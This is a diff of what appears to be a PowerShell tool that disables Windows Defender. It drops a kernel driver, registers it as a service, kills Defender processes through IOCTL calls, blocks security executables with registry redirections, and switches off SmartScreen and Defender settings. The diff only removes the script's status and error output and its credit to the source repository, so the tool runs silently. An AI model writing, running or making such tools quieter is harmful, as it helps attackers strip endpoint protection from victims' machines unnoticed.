@@ -513,7 +513,7 @@ function Kill-DefenderProcs {
     ([WinAPI]::GENERIC_READ -bor [WinAPI]::GENERIC_WRITE),
     0, [IntPtr]::Zero, [WinAPI]::OPEN_EXISTING, [WinAPI]::FILE_ATTR_NORMAL, [IntPtr]::Zero)
   if ($h -eq $INVALID_HANDLE) {
-    Write-Host '  [ERROR] Cannot open \\.\Warsaw_PM' -F Red
+    
     return $false
   }
 
@@ -526,11 +526,11 @@ function Kill-DefenderProcs {
       $ret = 0
       $ok = [WinAPI]::DeviceIoControl($h, $DRV_IOCTL, $buf, 1036, [IntPtr]::Zero, 0, [ref]$ret, [IntPtr]::Zero)
       if ($ok) {
-        Write-Host "  [+] $name (PID $($p.Id)) terminated"
+        
         $any = $true
       }
       else {
-        Write-Host "  [-] IOCTL failed for $name PID $($p.Id) (err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+        
       }
     }
   }
@@ -558,12 +558,12 @@ function Set-IFEOBlock {
 
   # Snapshot live IFEO
   if ((Invoke-Reg @('save', "HKLM\$IFEO_KEY", $hivePath, '/y')) -ne 0) {
-    Write-Host '  [!] reg save IFEO failed' -F Red; return $false
+   
   }
 
   # Load it under a synthetic name we can modify
   if ((Invoke-Reg @('load', "HKLM\$TEMP_HIVE_NAME", $hivePath)) -ne 0) {
-    Write-Host '  [!] reg load TempIFEO failed' -F Red; return $false
+   
   }
 
   foreach ($t in $IFEO_TARGETS) {
@@ -581,7 +581,7 @@ function Set-IFEOBlock {
 
   # Restore (REG_FORCE_RESTORE) -- requires /f
   if ((Invoke-Reg @('restore', "HKLM\$IFEO_KEY", $hivePath, '/f')) -ne 0) {
-    Write-Host '  [!] reg restore IFEO failed' -F Red
+    
     Remove-Item $hivePath, "$hivePath.LOG1", "$hivePath.LOG2" -Force -EA SilentlyContinue
     return $false
   }
@@ -603,11 +603,11 @@ function Extract-Driver {
   Remove-Item $cabFile -Force -EA SilentlyContinue
 
   if ($ec -ne 0 -or -not (Test-Path $dst)) {
-    Write-Host "  [ERROR] expand.exe failed (exit $ec) -- driver not written" -F Red
+
     return $null
   }
 
-  Write-Host "  [+] $DRV_FILENAME deployed to drivers\ ($((Get-Item $dst).Length) B)"
+  
   return $dst
 }
 
@@ -620,27 +620,27 @@ function Remove-DriverFile {
 
 function Invoke-Kill {
  
-  Write-Host '  [*] Extracting kvckiller.sys from embedded CAB...'
+  
   $drv = Extract-Driver
   if (-not $drv) { return 1 }
 
-  Write-Host '  [*] Applying IFEO block...'
+ 
   Set-IFEOBlock -AddBlock $true | Out-Null
 
-  Write-Host "  [*] Installing $DRV_SERVICE service..."
+
   if (-not (Install-KillerService -BinPath $drv)) {
-    Write-Host '  [!] sc create failed' -F Red
+    
     Remove-DriverFile
     return 1
   }
   if (-not (Start-KillerService)) {
-    Write-Host '  [!] sc start failed' -F Red
+    
     & sc.exe delete $DRV_SERVICE | Out-Null
     Remove-DriverFile
     return 1
   }
 
-  Write-Host '  [*] Issuing IOCTL kill...'
+ 
   Kill-DefenderProcs | Out-Null
 }
 
@@ -1169,8 +1169,7 @@ function Run-Trusted([String]$command) {
 }
 
 
-Write-Host 'Running Initial Stage...'
-Write-Host 'Using kill function from [https://github.com/wesmar/WinDefCtl]'
+
 Invoke-Kill
 
 #disable notifications and others that are allowed while defender is running
@@ -1186,7 +1185,7 @@ Run-Trusted -command "Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender' /v 
 Run-Trusted -command "Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' /v 'SmartScreenEnabled' /t REG_SZ /d 'Off' /f"
 Run-Trusted -command "Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' /v 'AicEnabled' /t REG_SZ /d 'Anywhere' /f"
 
-Write-Host 'Disabling Defender with Registry Hacks...' 
+ 
 
 New-item -Path "$env:TEMP\disableReg" -ItemType Directory -Force | Out-Null
 New-Item -Path "$env:TEMP\disableReg\disable1.reg" -Value $file1 -Force | Out-Null
@@ -1218,7 +1217,7 @@ foreach ($task in $tasks) {
   }
 }
 
-Write-Host 'Removing service, cleaning Up...Done!' -ForegroundColor Green
+
 Remove-Item "$env:TEMP\disableReg" -Recurse -Force
 Stop-KillerService
 Remove-DriverFile
